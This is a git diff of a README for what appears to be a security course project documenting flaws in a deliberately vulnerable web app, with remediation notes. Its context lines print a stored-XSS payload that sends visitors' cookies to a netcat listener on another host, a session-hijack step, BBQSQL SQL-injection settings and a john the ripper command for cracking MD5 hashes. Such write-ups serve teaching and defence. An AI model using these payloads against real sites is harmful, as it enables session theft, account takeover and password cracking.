@@ -31,7 +31,8 @@ TODO
     ```
     <script>document.write('<img src="http://192.168.0.117:1234/' + document.cookie + '">')</script>
     ```
-3. Start a netcat server using the command `nc -lp 1234`. When a user opens the attendees page, a request is sent to this server:
+3. Start a netcat server using the command `nc -lp 1234` on the specified host. When a user opens the attendees page, a request is sent to this server:
+
     ![Result of XSS](https://raw.githubusercontent.com/BenjaminStienlet/cybersecuritybase-project/master/images/XSS_session_cookie.png)
 4. We now can take over the session of this user by changing our own session cookie using `document.cookie="JSESSIONID=E0ED84B16865028DF09E522DC8B8DDC8"` in the browser console. This way we are able to steal the session of the admin user when this user logs in.
 
@@ -88,6 +89,7 @@ TODO
     concurrency = 30
     ```
 6. This tool gives the following output:
+
     ![Result of BBQSQL](https://raw.githubusercontent.com/BenjaminStienlet/cybersecuritybase-project/master/images/SQLI_result.png)
 
 **Remediation**:
@@ -104,9 +106,11 @@ TODO
 
 1. In the previous flaw, we found the user names and hashes of the passwords. Using an [online tool](https://www.onlinehashcrack.com/hash-identification.php) to identify the hash type, we can see that these hashes are probably MD5 hashes.
 2. We can try to crack the hashes using the tool 'john the ripper' with the command `john -format=raw-MD5 bbqsql_output.csv`:
+
     ![Result of john](https://raw.githubusercontent.com/BenjaminStienlet/cybersecuritybase-project/master/images/SQLI_result.png)
 
     We could also check an [online reverse lookup](http://md5.gromweb.com/) for the MD5 hashes:
+
     ![Result of reverse lookup](https://raw.githubusercontent.com/BenjaminStienlet/cybersecuritybase-project/master/images/MD5_reverse_lookup.png)
 
 **Remediation**:
